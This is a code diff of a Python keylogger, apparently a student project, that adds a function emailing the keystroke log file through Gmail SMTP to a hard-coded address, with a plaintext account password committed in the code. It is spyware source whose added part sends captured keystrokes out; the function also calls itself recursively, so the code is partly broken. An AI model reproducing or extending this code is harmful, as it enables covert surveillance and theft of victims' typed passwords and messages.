@@ -37,17 +37,55 @@ from PIL import ImageGrab
 # default variables
 keys_information = "key_log.txt"  # where all the key that are logged going to be appended to
 email_address = "collegepjct@gmail.com" # email we are going to be send from
+password = "Pr&c!s@Mud4r"
+
+toaddr = "collegepjct@gmail.com"
 
 file_path = "D:\\NCI\\Semester_3\\Project\\Keylogger\\Test2\\Project"  # file path where the key_log.txt will be store
 extend = "\\"
 
 # email controls/functionality - send the keystrokes to email
 def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
 
+    # create a message (Multi internet mail extensions) allowing to format email msg to support character, text and attachments
+    msg = MIMEMultipart()
 
+    msg['From'] = fromaddr # define the sending address
+    msg['To'] = toaddr
+    msg['Subject'] = "Log File"
 
+    body = "Body_of_the_mail"
 
+    msg.attach(MIMEText(body, 'plain'))
 
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    # encode the message
+    p.set_payload(attachment.read()) #read the attachment
+
+    encoders.encode_base64(p) # finish encode
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) # add header to the msg
+
+    msg.attach(p) # attach the msg
+
+    # create SMTP session
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls() # start TLS session
+
+    s.login(fromaddr, password) # login to the email
+
+    text = msg.as_string() # convert the MIME msg  into string
+
+    s.sendmail(fromaddr, toaddr, text) # send email
+    s.quit()
+
+    send_email(keys_information, file_path + extend + keys_information, toaddr)
 
 # constant variable
 count = 0
